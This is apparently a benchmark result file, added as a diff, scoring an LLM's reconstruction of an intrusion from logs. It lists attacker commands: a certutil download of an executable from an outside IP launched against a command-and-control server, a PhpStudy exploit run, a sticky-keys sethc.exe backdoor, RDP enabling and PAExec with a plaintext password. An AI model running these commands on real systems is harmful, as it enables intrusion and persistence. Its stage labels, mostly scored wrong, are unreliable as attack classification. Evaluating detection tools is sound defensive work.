@@ -1,0 +1,110 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py ",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\\/f\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\sethc.exe\" /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "This attack appears to be a complex staged exploitation where an attacker has gained initial access using unauthorized Remote Desktop connection through modifications made via Registry modifications and Network Firewall Rule additions.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67048,
+      "completion_tokens": 1693,
+      "total_tokens": 68741,
+      "wall_clock_s": 10.579,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.5333333333333333,
+      "recall": 0.8,
+      "f1": 0.64,
+      "tp": 8,
+      "fp": 7,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.06666666666666667,
+      "recall": 0.16666666666666666,
+      "f1": 0.09523809523809522,
+      "tp": 1,
+      "fp": 14,
+      "fn": 5,
+      "recall_partial": 0.4166666666666667
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 67048,
+      "completion_tokens": 1693,
+      "total_tokens": 68741,
+      "wall_clock_s": 10.579,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
